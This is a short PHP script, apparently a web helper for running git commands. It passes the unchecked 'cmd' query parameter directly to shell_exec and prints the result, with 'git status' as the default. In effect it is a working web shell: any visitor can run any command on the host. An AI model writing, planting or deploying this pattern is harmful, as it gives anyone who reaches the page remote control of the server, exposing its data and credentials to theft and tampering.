<?php
header('Content-Type: text/plain');
$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : 'git status';
echo "Running: $cmd\n\n";
$output = shell_exec($cmd . ' 2>&1');
echo $output;
